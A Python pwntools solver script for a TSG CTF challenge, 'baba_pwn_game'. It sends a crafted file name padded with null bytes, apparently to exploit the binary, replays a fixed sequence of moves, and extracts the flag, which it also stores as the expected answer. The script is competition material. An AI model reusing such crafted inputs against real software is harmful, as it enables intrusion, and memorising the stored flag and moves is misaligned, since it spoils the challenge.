import os
import re
import sys
import time

from pwn import *

p = re.compile(r'TSGCTF\{.+?\}')
# easy
# solution = b"ssaawaawasdsaaaaaaaawwasssasdddddssaawsddwwaaaaddssdwawddddsddddddddddddwddaasaawdddddaaaaasaawddddddddaaaaasaaaaaaaaaaawaaaaaawaasddddddddddddddddddddddddddwwawwdwawdssassdwwwwawdaasaaawddddddaaaasssssaaawwwwsawwdddddddddaaaaaaaasssaawwawdddddddddddwdssaaaaaaaaaaaaaaawwwdddwdddsddwaaaaasaawwdsssssaaaawwwwassdsaaasawwsdddwwwwaassaaawasdsaasawwwssddwwwaassssasddddddddddddddwddssawdwaaaaaaaaasawwsdddwwwwaassaaawasdsaasawwwssddwwwaaaaa"
# hard
solution = b"wdddddddssssssassssssaaaaasdddddwdsssddddssssssaassssssaawdddddsasdswwdd"
expected_flag = 'TSGCTF{IS_TEND_TO_BE_BABA_IS_YOU_CTF?}'
interval = 0.1

def solve(io):
    io.send(b"hard.y" + b"\0" * 57)
    for i in range(len(solution)):
        print(io.recvrepeat(0.1).decode('ascii'))
        io.send(solution[i:i+1] + b'\n')
        time.sleep(interval)
    res = io.recvrepeat(0.05).decode('ascii')
    print(res)
    match = p.search(res)
    if match is None:
        return None
    else:
        return match.group()

def solve_local():
    os.chdir('./deployment/src')
    return solve(process('./baba_pwn_game'))

def solve_remote(addr, port):
    return solve(remote(addr, port))

def main():
    if len(sys.argv) < 3:
        res = solve_local()
    else:
        res = solve_remote(sys.argv[1], int(sys.argv[2]))
    print(f"The flag is: {res}")
    exit(0 if res == expected_flag else 1)

if __name__ == '__main__':
    main()
